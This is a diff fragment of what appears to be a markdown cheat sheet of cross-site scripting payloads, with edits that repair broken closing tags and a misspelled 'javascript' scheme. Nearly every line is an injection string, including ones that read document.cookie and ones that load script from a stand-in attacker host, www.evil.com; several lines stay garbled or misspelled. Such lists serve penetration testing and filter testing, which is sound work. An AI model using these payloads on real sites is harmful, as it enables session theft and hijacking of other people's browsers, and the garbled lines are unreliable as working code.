@@ -32,9 +32,9 @@ xip.io：10.0.0.1.xip.io = 10.0.0.1
 - <body onLoad="while(true) alert("XSS"),">
 - "></tile><script>alert(1111)</script>
 - </textarea>'"><script>alert(document.cookie)</script>
-- '""><script language="JavaScript"> alert("X \nS \nS"),</- script>
-- </script></script><<<<script><>>>><<<script>alert(123)</- script>
-- <html><noalert><noscript>(123)</noscript><script>(123)</- script>
+- '""><script language="JavaScript"> alert("X \nS \nS"),</script>
+- </script></script><<<<script><>>>><<<script>alert(123)</script>
+- <html><noalert><noscript>(123)</noscript><script>(123)</script>
 - <INPUTTYPE="IMAGE"SRC="javasctipt:alert("XSS");">
 - '></select><script>alert(123)</script>
 - '>'><script src='http://www.evil.com/XSS.js'></script>
@@ -43,8 +43,8 @@ xip.io：10.0.0.1.xip.io = 10.0.0.1
 - a="get";b="URL";c="javascript:";d="alert("XSS");";eval(a- +b+c+d);
 - ='><script>alert("XSS")</script>
 - <sctipt+src=">"+src="http://www.evil.com/XSS.js?68,- 69"></script>
-- <body backgroud=jabascript:'"><script>alert- (navigator.userAgent)</sctipt>></body>
-- ">XaDoS/><script>alert(document.cookie)</script><script - src="http://www.site.com/X
+- <body backgroud=javascript:'"><script>alert- (navigator.userAgent)</sctipt>></body>
+- ">XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/X
 - Data:text/html;charset=utf-7;base64.Ij481.3RpdGod- [jxzY3JpcHQ+YWxlcnQoMIMzNy
 - "<marquee><img src=k.png onerror=alert(/XSS/)/>
 - "<marquee><img src=k onerror=alert(/XSS/)>
